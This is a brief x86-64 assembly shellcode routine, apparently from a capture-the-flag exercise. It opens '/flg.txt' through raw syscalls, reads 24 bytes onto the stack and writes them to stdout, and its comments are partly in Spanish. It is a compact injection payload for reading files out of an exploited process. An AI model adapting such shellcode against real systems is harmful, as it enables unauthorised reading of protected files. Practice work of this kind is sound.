section .text
_start:
    ; push './flg.txt\x00'
    push 0              ; push NULL string terminator
    mov rdi, 0x7478742e676c662f  ; "/flg.txt" en reversa
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to filename

    ; open('rsp', 'O_RDONLY')
    mov al, 2          ; open syscall number
    xor esi, esi       ; set O_RDONLY flag
    syscall

    ; read file
    mov rdi, rax       ; set fd to rax from open syscall
    mov rsi, rsp       ; use stack as buffer
    mov dl, 24         ; size to read
    xor eax, eax       ; read syscall number
    syscall

    ; write output
    mov al, 1          ; write syscall
    mov dil, 1         ; set fd to stdout
    syscall